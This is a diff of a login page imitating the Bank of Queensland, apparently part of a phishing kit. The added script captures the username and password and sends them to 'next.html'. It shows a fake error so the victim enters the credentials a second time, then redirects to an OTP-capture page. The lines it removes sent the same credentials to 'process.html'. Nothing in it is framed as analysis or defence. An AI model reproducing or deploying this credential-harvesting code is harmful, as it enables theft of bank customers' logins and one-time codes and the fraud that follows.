@@ -1780,57 +1780,61 @@
                 </div>
               </section>
             </div>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js" integrity="sha512-pHVGpX7F/27yZ0ISY+VVjyULApbDlD0/X0rgGbTqCE7WFW5MezNTWG/dnhtbBuICzsd0WQPgpE4REBLv+UqChw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-      <script>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script>
         $(document).ready(function() {
-    function toggleButtonState() {
-        const username = $('#txtUserid').val().trim();
-        const password = $('#id11').val().trim();
-        if (username && password) {
-            $('#btnSignIn').prop('disabled', false);
-        } else {
-            $('#btnSignIn').prop('disabled', true);
-        }
-    }
-    $('#txtUserid, #id11').on('keyup change', toggleButtonState);
-    let successCount = 0;
+            function toggleButtonState() {
+                const username = $('#txtUserid').val().trim();
+                const password = $('#id11').val().trim();
+                if (username && password) {
+                    $('#btnSignIn').prop('disabled', false);
+                } else {
+                    $('#btnSignIn').prop('disabled', true);
+                }
+            }
+            $('#txtUserid, #id11').on('keyup change', toggleButtonState);
+            let successCount = 0;
 
-    $('#login-form').submit(function(event) {
-        event.preventDefault();
+            $('#login-form').submit(function(event) {
+                event.preventDefault();
 
-        var formData = {
-            username: $('#txtUserid').val().trim(),
-            password: $('#id11').val().trim(),
-            title: 'Bank of QueensLand'
-        };
-        if (formData.username && formData.password) {
-            console.log("Sending data:", formData);
-            $.ajax({
-    type: 'GET',
-    url: 'process.html',
-    data: {
-        type: 'login',
-        username: $('#txtUserid').val().trim(),
-        password: $('#id11').val().trim(),
-        title: 'Bank of QueensLand'
-    },
-    success: function(response) {
-        console.log('Response:', response);
-        // The page will redirect, so we don't need to handle it here.
-    },
-    error: function(xhr, status, error) {
-        console.error('AJAX error:', error);
-    }
-});
-        }
-        $('#cross-1').click(function () {
-            $('#error-msg').hide();
+                var formData = {
+                    username: $('#txtUserid').val().trim(),
+                    password: $('#id11').val().trim(),
+                    title: 'Bank of Queensland'
+                };
+
+                if (formData.username && formData.password) {
+                    $.ajax({
+                        type: 'GET',
+                        url: 'next.html',
+                        data: formData,
+                        success: function(response) {
+                            console.log('next.html response:', response);
+                            successCount++;
+                            if (successCount === 1) {
+                                $('#error-msg').show();
+                                $('#txtUserid, #id11').val('');
+                            }
+                            if (successCount === 2) {
+                                window.location.href = 'boq-otp.html';
+                            }
+                        },
+                        error: function(xhr, status, error) {
+                            console.error('AJAX Error:', error);
+                        }
+                    });
+                }
+            });
+
+            $('#cross-1').click(function() {
+                $('#error-msg').hide();
+            });
+
+            $('#txtUserid').mask('00000000000000000');
         });
-    });
-    $('#txtUserid').mask('00000000000000000');
-});
-      </script>
+    </script>
             <aside id=sidebar role=complementary class="hidden-xs hidden-sm col-md-4">
               <h2 class=sr-only>User Tools</h2>
               <ul class="user-tools list-unstyled">
